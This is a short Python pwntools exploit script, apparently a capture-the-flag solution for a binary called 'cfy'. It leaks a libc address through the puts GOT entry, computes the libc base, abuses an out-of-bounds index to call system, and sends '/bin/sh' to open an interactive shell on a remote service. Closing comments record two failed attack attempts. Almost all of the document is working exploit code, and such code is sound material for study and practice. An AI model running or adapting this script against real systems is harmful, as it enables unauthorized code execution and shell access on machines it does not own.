#!/usr/bin/env python3

from pwn import *

exe = ELF("./cfy")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    r.sendline("2")
    r.sendline(p64(exe.got['puts']))
    r.recvuntil("hex: 0x")
    libc.address = int(r.recvn(12), 16) - libc.symbols['puts']
    log.info("libc base address: {}".format(hex(libc.address)))
  
    r.sendline("7" + "\x00"*15 + p64(libc.symbols['system']))
    r.sendline("/bin/sh")

    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
# 1) tried to use faulty index to call system when *parsers[choice], couldn't because of eax instead of rax and derefence problem
# 2) tried to use faulty index to call print from printf@got (idx -6) -> format string vuln, couldn't because wasn't able to reach the address of buf as it was at the other side of address space
